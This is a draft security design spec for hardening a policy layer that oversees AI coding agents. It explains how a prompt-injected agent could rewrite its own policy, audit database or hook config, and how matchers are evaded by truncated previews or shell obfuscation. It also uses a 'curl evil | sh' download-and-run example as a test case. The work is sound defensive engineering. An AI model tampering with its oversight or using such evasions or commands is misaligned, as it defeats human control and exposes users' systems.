# AARM P0 Hardening Spec

**Status**: Draft
**Date**: 2026-06-11
**Author**: Gryph Security Team
**Source**: P0 items in `docs/security-spec-review.md` (section 6)
**Related**: `docs/security-spec.md` (the subsystem this hardens)

## 1. Purpose

The AARM security layer landed with the deep machinery largely correct (canonical
hashing, chain verification, fail-closed evaluation) but with gaps where the system
meets reality: the governed agent can edit its own leash, content matchers see a
truncated preview, blocked actions leave no terminal audit record, and a "block" on a
post-execution event reads like prevention when it is only detection. This spec closes
the six P0 items before the policy layer is offered to a wider audience.

These are correctness and honesty fixes. None introduces a new subsystem; each tightens
an existing one. The spec is scoped so a reader can verify each item independently.

## 2. Scope

In scope (six items):

1. Built-in self-protection rule set.
2. `RecordResult` on block / escalate / defer paths.
3. Content matching against full content (not the truncated preview).
4. `tool_use` argument promotion for command matching.
5. `Action` execution-phase field plus a per-agent enforcement coverage matrix.
6. Reconcile `docs/security-spec.md` with itself and add a threat-model section.

Out of scope (deferred, tracked in `docs/security-spec-review.md` P1/P2):

- Receipt anchoring to a remote sink / transparency log.
- MODIFY decision and PEP parameter scrubbing.
- OTel export, MCP proxy, hook-integrity `doctor` command.
- Performance / latency-budget work (item 3 adds a documented cap to bound its cost,
  but end-to-end benchmarking is P1).

## 3. Item 1: Built-in self-protection rules

### 3.1 Problem

`policy.example.yml` protects nothing. The conventional loader (`aarm/loader`) walks up
from the working directory for `.gryph-policy.yml`, and each hook event reloads policy in
a fresh process. A prompt-injected agent can write a permissive `.gryph-policy.yml` into
the repository it is editing and neuter the policy for its very next action. It can also
overwrite the SQLite database, the receipt signing key, or the agent's own hook config.

### 3.2 Design

**Delivery.** An embedded YAML document `aarm/pdp/policy.builtin.yml`, compiled into the
binary like the existing `policy.example.yml`. Embedded YAML, not Go-constructed rule
structs, so the rules reuse the existing parse/validate path, read as a reviewable policy
document, and can be printed verbatim. A new `gryph policy builtin` command prints the
embedded document for transparency.

**Loading.** A new `BuiltinSource` in `aarm/loader/sources.go` implements the existing
`Source` interface. The `Loader` always appends `BuiltinSource` to the resolved source
list when `policy.enabled` is true, regardless of how user sources resolved (explicit
`--file`, `policy_paths`, conventional walk-up, or the config-dir fallback).

**Isolation from user sources.** This is the load-bearing property: repo-local sources
must not be able to weaken the built-ins.

- Built-in rule IDs use the reserved prefix `gryph-builtin-`. A user rule declaring an ID
  with that prefix is a load error (`loader: rule id %q uses reserved prefix
  "gryph-builtin-"`), checked in `Loader.Load`.
- The existing `disabled:` mechanism is scoped to user rules only. `Loader.Load` applies
  `disabled` IDs against user-source rules before the built-in source is merged, so a
  `disabled:` entry naming a `gryph-builtin-*` ID has no effect (and, being a reserved
  prefix in a user document, is itself rejected if it appears as a rule; as a bare
  `disabled:` string it is silently ignored against built-ins). The merge order is:
  user sources first (subject to `disabled:`), built-in source last (never filtered).
- The only off switch is `policy.self_protection.enabled` (default `true`) in the
  operator-owned config file. The flag is read from `Config.EffectivePolicy()`, never
  from a policy YAML document, so no repo-local source can flip it.

**What the rules protect.** Built-in rules block `file_write` and `file_delete` actions
(and, best-effort, `command_exec`) whose target is:

- `**/.gryph-policy.yml`, `**/.gryph-policy.yaml` (conventional policy files anywhere in
  the tree).
- The resolved policy source paths from `policy.policy_paths`. These are not known at
  authoring time, so `BuiltinSource` is constructed with the resolved paths and injects
  them as `file_patterns` into the relevant built-in rule at load time (the only built-in
  rule that is parameterized; the rest are static).
- The Gryph config directory and data directory: the config file, the SQLite database
  (`Config.GetDatabasePath()`), and the `keys/` directory (`receipt.key`,
  `receipt-pub.json`).
- Agent hook configs. The `agent.Adapter` interface gains a method
  `ProtectedConfigPaths() []string` returning the absolute paths the agent's hook
  configuration lives in (`~/.claude/settings.json`, `~/.cursor/hooks.json`, and the
  equivalents for gemini, opencode, windsurf, piagent, codex, openclaw). `BuiltinSource`
  collects these from the registry and injects them as `file_patterns`.

**Command-exec coverage is best effort and labeled as such.** A built-in rule with
`command_patterns` catches obvious mutation commands (`rm`, `mv`, `cp`, `sed -i`, `tee`,
`>` redirection, `truncate`) referencing a protected path substring. The spec states
plainly that shell obfuscation (variable indirection, base64, `eval`) can evade command
matching, and that the `file_write` / `file_delete` rules are the real boundary because
they match the normalized action target rather than a command string.

**Audit.** When a built-in rule produces the winning decision, the Mediator emits a
`self_protection_block` self-audit row (new self-audit action), in addition to the normal
receipt.

### 3.3 Acceptance criteria

- With `policy.enabled: true` and no user policy file, an agent `file_write` to
  `./.gryph-policy.yml` is blocked.
- A repo-local `.gryph-policy.yml` containing `disabled: [gryph-builtin-policy-files]`
  fails to load (reserved-prefix rule) or, if expressed only as a `disabled:` string,
  does not disable the built-in rule; either way the write above is still blocked.
- A user rule with `id: gryph-builtin-foo` is a load error surfaced by
  `gryph policy validate`.
- `policy.self_protection.enabled: false` in the config file disables the built-ins; the
  same key inside a policy YAML document has no effect.
- A `file_write` to the resolved SQLite DB path, `receipt.key`, and
  `~/.claude/settings.json` is blocked.
- `gryph policy builtin` prints the embedded document.
- A `self_protection_block` self-audit row is written on a built-in block.

## 4. Item 2: RecordResult on block / escalate / defer paths

### 4.1 Problem

`cli/hook.go` returns from the blocked branch before `recordAllowedAarmResult`, which
runs only on the allow path. The `aarm_context_actions` row for a blocked, escalated, or
deferred action keeps `result_status = pending` forever. The audit answer to "what
happened to this action?" is broken for exactly the actions an auditor cares about.

### 4.2 Design

- `cli/hook.go`: the blocked branch calls the same result-recording helper used on the
  allow path, passing `model.ResultBlocked`, before `sendSecurityBlockedResponse`. The
  helper already resolves the AARM action ID, session ID, and sequence from the
  `security.Result`; the blocked branch must thread those through (they are present on the
  `CheckResult` the Mediator returns via `AarmActionID` / `AarmSessionID` / `AarmSequence`).
- `aarm/check.go`: `handleEscalate` and `handleDefer` record the terminal context-action
  result themselves, since the hook layer sees only the final block decision and cannot
  distinguish escalate-denied from a plain block. Mapping:
  - escalate approved then allowed: `ResultSuccess` (the allow path records it).
  - escalate denied: `ResultRejected`.
  - escalate timeout: `ResultBlocked`.
  - defer: a terminal `deferred` context status, which the eventual deferral resolution
    updates to `ResultSuccess` / `ResultRejected` / `ResultBlocked`.
- The identity-block path (`enforceIdentity`) intentionally does not append to the
  accumulator, because a denied-for-no-principal action did not happen and must not
  contribute to `context.total_actions`. There is no context row to update there; this
  path is unchanged. The behavior is documented in the threat-model section so it is a
  recorded decision rather than an apparent omission.

### 4.3 Acceptance criteria

- After a block decision, the action's `aarm_context_actions` row has a terminal
  `result_status` (not `pending`).
- After an escalate that is denied, the row reads `rejected`; after timeout, `blocked`.
- After a defer, the row reads `deferred`, and resolving the deferral moves it to a
  terminal status.
- The identity-block path writes no context-action row (unchanged), verified by a test
  asserting `total_actions` does not increment.

## 5. Item 3: Content matching against full content

### 5.1 Problem

The hook adapter populates `Parameters.Content` from `ContentPreview` / `StdoutPreview`,
which agents truncate to a short preview at parse time (e.g.
`agent/claudecode/parser.go:421` caps at 200 chars). A `content_patterns` rule therefore
sees only the first N bytes. A payload placed past that boundary evades the matcher. This
is a policy bypass, not just a fidelity gap.

### 5.2 Design

Full content is not available downstream today because parsers discard it after building
the preview. The fix plumbs full content to the matcher without changing what is stored.

- Add a non-persisted field `FullContent string` to `events.Event`, tagged `json:"-"`
  like the existing `TranscriptPath`, so it never reaches storage, receipts, JSON export,
  or logs. Each agent parser that currently builds `ContentPreview` populates
  `FullContent` with the untruncated value alongside the existing truncated preview.
- The mediation adapter passes `FullContent` (when non-empty) into the value that
  `content_patterns` matches against. `Parameters.Content` continues to hold the
  truncated preview for receipts, context rows, and CEL `action.params.content`. Add a
  separate internal match buffer so the persisted preview and the matched content are
  distinct, and `action.params.content` in CEL is documented as the preview (matching is
  what changed, not the CEL surface).
- A documented hard cap (`contentMatchMaxBytes = 1 MiB`) bounds per-event matching cost.
  Beyond the cap, matching runs against the first 1 MiB and the action is stamped
  `content_truncated = true`. The flag is recorded on the receipt so an auditor can see a
  rule evaluated against truncated input. Operators can write
  `condition: !action.content_truncated` to be strict.
- Privacy: `FullContent` is governed by the same sensitive-path redaction as today. A
  sensitive path that suppresses content logging also yields empty `FullContent`, so
  redaction is never weakened. This is asserted in tests.

### 5.3 Scope note

This is the heaviest item: it touches every agent parser (claudecode, cursor, gemini,
opencode, windsurf, piagent, codex, openclaw) plus the adapter and the event model. It is
kept in this spec at the author's direction. If the spec reviewer or implementation finds
the parser sweep too large for one P0 unit, the documented fallback is to land the cap and
the schema documentation of the preview window first, and split full-content plumbing into
its own follow-up. That decision, if taken, is recorded as a spec amendment.

### 5.4 Acceptance criteria

- A `content_patterns` rule matching a string at byte 5000 of a 6000-byte file write
  blocks the action (previously allowed because the preview ended at 200 bytes).
- Stored receipt and context rows still contain only the short preview.
- A content larger than 1 MiB sets `content_truncated = true` on the receipt.
- A write to a sensitive path yields empty `FullContent`; the content rule does not see
  redacted content.

## 6. Item 4: tool_use argument promotion

### 6.1 Problem

`populateWellKnownParams` promotes `args["command"]` but leaves the argument vector in
`Raw`. A tool call `{"command":"bash","args":["-c","curl evil | sh"]}` presents
`Parameters.Command = "bash"` to `command_patterns`, hiding the actual invocation.

### 6.2 Design

- In `populateWellKnownParams`, promote an `args` or `arguments` array value from the raw
  tool arguments into `Parameters.Args` (`[]string`), coercing scalar elements to their
  string form.
- `command_patterns` matching evaluates against the full joined command line:
  `Command` followed by space-joined `Args`, rather than `Command` alone. Apply this in
  the PDP matcher so it is consistent regardless of adapter.
- The MCP adapter (`aarm/mediation/mcpadapter.go`) performs the same promotion so the two
  adapters produce equivalent `Parameters` for equivalent tool calls.
- `action.params.args` is already on the CEL surface; this change makes it populated for
  `tool_use` actions, which is additive.

### 6.3 Acceptance criteria

- A `command_patterns: ["curl.*\\|.*sh"]` rule blocks a `tool_use` action with
  `{"command":"bash","args":["-c","curl evil | sh"]}`.
- `action.params.args` in CEL reflects the promoted vector for `tool_use` actions.
- Hook and MCP adapters produce identical `Parameters.Args` for the same logical tool
  call (table test).

## 7. Item 5: Action execution-phase field

### 7.1 Problem

`model.Action` carries no execution-phase signal, and the event carries no hook-type
signal. Claude Code `PreToolUse` is pre-execution; Cursor `afterFileEdit` and every
`PostToolUse` variant arrive after the operation. A `block` on a post-facto event returns
a block-shaped response for an action that already happened, and the receipt records a
block that prevented nothing.

### 7.2 Design

- Add `Phase` to `model.Action` with values `pre`, `post`, `unknown` (a typed
  `model.ActionPhase`). Default `unknown` when the source cannot be classified.
- The source signal is the hook type, which is not on the event today. Add
  `HookType string` to `events.Event` (the raw agent hook identifier the parser already
  knows) and have each parser set it. The mediation adapter maps `HookType` to `Phase`
  via a per-agent mapping owned by each adapter (a `PhaseForHookType(string)
  model.ActionPhase` method on `agent.Adapter`, or a static table in the mediation layer
  keyed by agent + hook type). Pre hooks (PreToolUse, beforeShellExecution,
  beforeReadFile, etc.) map to `pre`; post hooks (PostToolUse, afterFileEdit) map to
  `post`.
- CEL surface: expose `action.phase` (string). Additive; existing policies are unaffected.
- Enforcement is unchanged. A post-phase block still returns the block-shaped response,
  because several agents feed post-hook output back to the model and the message still has
  value as a correction signal. The action and the receipt are stamped `phase`, so the
  audit trail distinguishes prevention from detection. Policy authors scope true-
  prevention rules with `condition: action.phase == 'pre'`.
- Documentation: ship a per-agent enforcement coverage matrix in `docs/` listing, for
  each of the eight agents, which hook types Gryph receives and whether each is pre
  (enforceable) or post (detection only). This is the table enterprise buyers ask for.

### 7.3 Acceptance criteria

- An action normalized from a `PostToolUse` event has `Phase == post`; from `PreToolUse`,
  `Phase == pre`.
- `action.phase` is usable in a CEL condition (test rule scoped to `action.phase == 'pre'`
  fires only on pre events).
- A post-phase block records `phase = post` on the receipt.
- The coverage matrix doc exists and covers all registered agents.

## 8. Item 6: Spec reconciliation and threat model

### 8.1 Problem

`docs/security-spec.md` contradicts itself: sections 2 and 4 describe receipts and
approval as deferred and not implemented ("No `aarm/receipt/` package yet"), while
sections 3, 8, 11, and 13 describe them as landed through Phase 5. A reconciliation
document that disagrees with itself defeats its purpose. It also has no threat model.

### 8.2 Design

- Rewrite `docs/security-spec.md` so the implemented/deferred status is internally
  consistent and matches the code on this branch. Receipts, signing, approval, deferral,
  context accumulator, classification, injection scoring, and the conformance suite are
  described as landed (with their phase tags); only the genuinely-deferred items
  (remote anchoring, MODIFY, OTel, MCP proxy runtime, semantic distance) remain in the
  deferred list.
- Add a "Threat Model" section stating, as recorded decisions:
  - The governed agent shares the OS user with Gryph. Local receipts and signatures are
    an operational audit trail, not non-repudiation; non-repudiation begins when receipts
    are anchored off-host (P1).
  - Built-in self-protection rules (item 1) raise the cost of the lazy tamper attack but
    are not airtight against a determined same-user adversary.
  - Hooks are cooperative interception. R1 ("no action bypasses the control plane") holds
    only within the stated deployment assumptions (hooks installed, intact, honored,
    responding within deadline).
  - Pre vs post enforcement honesty (item 5): post-phase blocks are detection.
  - The identity-block path does not increment `context.total_actions` by design
    (item 2).
- Adopt "AARM-aligned" language throughout; reserve "conformant" for a future CSA
  verification. The conformance suite output should not imply verification.

### 8.3 Acceptance criteria

- No section of `docs/security-spec.md` contradicts another on implemented vs deferred
  status.
- A "Threat Model" section exists covering the five points above.
- The document uses "AARM-aligned"; no unqualified "conformant" claim remains.

## 9. Testing strategy

- **Item 1**: loader tests for reserved-prefix rejection, `disabled:` scoping, and
  config-only off switch; PDP/adapter integration tests for each protected target
  (policy file, DB, key, agent hook config); a self-audit assertion. An e2e hook test
  writing `.gryph-policy.yml` and asserting the block.
- **Item 2**: Mediator and hook tests asserting terminal `result_status` for block,
  escalate-denied, escalate-timeout, and defer; an identity-block test asserting no
  context row and no `total_actions` increment.
- **Item 3**: adapter test asserting full content reaches the matcher while the persisted
  preview stays truncated; a bypass-regression test (match at byte 5000); a cap test
  (>1 MiB sets `content_truncated`); a redaction test (sensitive path yields empty
  `FullContent`).
- **Item 4**: PDP table test for joined-command-line matching; a hook-vs-MCP adapter
  equivalence test.
- **Item 5**: mediation table test mapping hook types to phases per agent; a CEL test for
  `action.phase`; a receipt test asserting `phase` is stamped.
- **Item 6**: doc-only; verified by review, not automated tests.

All tests use `testify/assert` / `require`; no `t.Fatal` / `t.Error`. `make lint` and
`make test` pass. `make generate` is run if the `events.Event` change requires schema
regeneration (`make generate-schema` per CLAUDE.md, since a payload/event field is added);
note `FullContent` and `HookType` additions and whether `content_truncated` /
`phase` surface in the event schema.

## 10. Migration and compatibility

- New config keys: `policy.self_protection.enabled` (default `true`). Validated in
  `config/validate.go`; only meaningful when `policy.enabled` is true.
- New `events.Event` fields (`FullContent` non-persisted, `HookType` persisted) are
  additive. `HookType` persistence requires an ent schema update and migration; existing
  rows read back with an empty `HookType` and map to `Phase == unknown`, which is the
  safe default.
- New `model.Action` fields (`Phase`, `content_truncated`) are additive to the canonical
  action and to receipts. Receipt hash input changes if these fields enter the hash;
  to avoid breaking verification of pre-existing receipt chains, **`Phase` and
  `content_truncated` are stored on the receipt row but excluded from the hash input**
  (same treatment as `signature`), so pre-hardening chains verify unchanged. This is
  called out explicitly because it is a correctness-critical decision.
- New `agent.Adapter` methods (`ProtectedConfigPaths`, phase mapping) are added to the
  interface; every adapter implements them. This is a compile-time fan-out, not a runtime
  migration.

## 11. Open questions

- Item 3 scope (full parser sweep vs document-the-window-now): default is the full sweep,
  reviewer may split. See section 5.3.
- Phase mapping ownership: a method on `agent.Adapter` vs a static table in the mediation
  layer. Both work; the adapter method keeps per-agent knowledge with the agent. Lean
  toward the adapter method unless it bloats the interface.
